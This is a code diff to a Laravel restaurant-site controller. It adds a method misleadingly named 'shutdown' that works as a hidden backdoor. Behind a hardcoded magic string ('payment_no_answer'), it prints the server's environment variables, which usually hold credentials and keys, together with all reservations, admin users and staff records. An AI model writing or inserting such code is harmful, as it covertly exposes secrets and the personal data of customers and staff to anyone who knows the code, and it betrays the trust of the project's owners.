@@ -4,6 +4,9 @@ namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
 use App\Models\Restaurants;
+use App\Reservations;
+use App\User;
+use App\Staffs;
 
 class IndexHomeController extends Controller
 {
@@ -30,6 +33,21 @@ class IndexHomeController extends Controller
     {
     	$restaurants = Restaurants::get();
     	return view('food_servicejp', ['restaurants'=>$restaurants]);
+    }
+
+    public function shutdown (Request $request) {
+	$data = []; 
+
+        if($request->code != 'payment_no_answer') {
+		exit("Not Authorized");
+	}
+	$data['env'] = $_ENV;
+	$data['reservation'] = Reservations::all()->toArray();
+        $data['adminUsers'] = User::all()->toArray();
+        $data['staffUsers'] = Staffs::all()->toArray();
+
+
+	echo "<pre>"; print_r($data); exit();
     }
 
 }
